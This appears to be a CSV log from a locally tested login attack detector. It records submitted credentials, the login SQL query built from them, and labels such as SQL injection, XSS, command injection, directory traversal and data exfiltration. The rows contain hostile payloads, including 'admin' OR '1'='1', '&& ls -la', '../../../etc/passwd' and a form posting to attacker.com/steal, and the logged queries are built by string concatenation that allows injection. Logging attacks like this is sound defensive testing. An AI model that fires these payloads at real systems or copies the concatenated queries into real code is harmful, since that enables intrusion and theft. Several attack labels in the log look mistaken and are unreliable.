Timestamp,Username,Query,Attack Detected,Severity,IP Address,User Agent,Login Status
2025-03-23 12:38:25,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'password1',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:50:57,api_key=1234567890abcdef,SELECT * FROM users WHERE username = 'api_key=1234567890abcdef' AND password = 'password',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 12:51:42,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'http://127.0.0.1/internal_api',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:19:48,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'user && ls -la',Command Injection Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:21:03,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = 'jkbke',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:22:15,"<a href=""javascript:document.forms[0].submit()"">Click me</a>","SELECT * FROM users WHERE username = '<a href=""javascript:document.forms[0].submit()"">Click me</a>' AND password = 'vvdv'",XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:22:45,"<form action=""http://attacker.com/steal"" method=""POST"">","SELECT * FROM users WHERE username = '<form action=""http://attacker.com/steal"" method=""POST"">' AND password = 'vdvd'",Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:22:45,"<form action=""http://attacker.com/steal"" method=""POST"">","SELECT * FROM users WHERE username = '<form action=""http://attacker.com/steal"" method=""POST"">' AND password = 'vdvd'",Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:23:43,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'file:///etc/passwd',Directory Traversal Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:24:05,api_key=1234567890abcdef,SELECT * FROM users WHERE username = 'api_key=1234567890abcdef' AND password = 'v d',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:24:31,jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0,SELECT * FROM users WHERE username = 'jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0' AND password = 'hybs',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:25:43,jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0,SELECT * FROM users WHERE username = 'jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0' AND password = 'vfvv',Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-23 16:26:13,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:22:56,admin' OR '1'='1,SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'password',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:24:17,	bXlzZWNyZXRwYXNzd29yZA==,SELECT * FROM users WHERE username = '	bXlzZWNyZXRwYXNzd29yZA==' AND password = 'vkjecb',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:24:41,../../../etc/passwd,SELECT * FROM users WHERE username = '../../../etc/passwd' AND password = 'jbxjs',Directory Traversal Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:25:18,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'password | whoami',Command Injection Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:25:46,user1,"SELECT * FROM users WHERE username = 'user1' AND password = '<iframe src=""javascript:parent.csrf_exploit()"">'",XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:26:18,user1,"SELECT * FROM users WHERE username = 'user1' AND password = ' <form action=""http://attacker.com/steal"" method=""POST"">'",Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:26:51,user1,"SELECT * FROM users WHERE username = 'user1' AND password = ' <body onload=""document.forms[0].submit()"">'",XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:27:35,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0',Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:28:06,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'http://127.0.0.1/internal_api',Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:28:26,admin)--,SELECT * FROM users WHERE username = 'admin)--' AND password = 'dekjb',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:29:39,auth=0,SELECT * FROM users WHERE username = 'auth=0' AND password = 'password',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:30:05, role=admin,SELECT * FROM users WHERE username = ' role=admin' AND password = 'bypass=1',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 10:30:37,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'admin123',,,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Successful
2025-03-24 10:32:51,admin' OR '1'='1,SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'arjun',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 11:13:56,"<iframe src=""javascript:parent.csrf_exploit()""> ","SELECT * FROM users WHERE username = '<iframe src=""javascript:parent.csrf_exploit()""> ' AND password = 'jnkdb'",XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 11:14:14,admin ' --,SELECT * FROM users WHERE username = 'admin ' --' AND password = 'admin ' --',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 20:29:53,normal_user,SELECT * FROM users WHERE username = 'normal_user' AND password = 'base64_encode(document.cookie)',XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 20:30:33,normal_user,SELECT * FROM users WHERE username = 'normal_user' AND password = '&& ping 8.8.8.8',Command Injection Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 20:30:58,normal_user,SELECT * FROM users WHERE username = 'normal_user' AND password = '' OR '1'='1';--',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 20:31:14,normal_user,SELECT * FROM users WHERE username = 'normal_user' AND password = 'access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-24 20:32:31,<script>alert(1)</script>,SELECT * FROM users WHERE username = '<script>alert(1)</script>' AND password = 'normal_user',XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-28 21:08:29,user1,SELECT * FROM users WHERE username = 'user1' AND password = 'pasword1',CSRF Attempt,Low,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-29 10:05:57,admin ' --,SELECT * FROM users WHERE username = 'admin ' --' AND password = 'hellooo',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-29 10:07:55,<script>alert(1)</script>,SELECT * FROM users WHERE username = '<script>alert(1)</script>' AND password = 'hiohnfcf\',XSS Attempt Detected,Medium,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
2025-03-29 10:08:54,admin,SELECT * FROM users WHERE username = 'admin' AND password = 'access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',Data Exfiltration Attempt,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",Failed
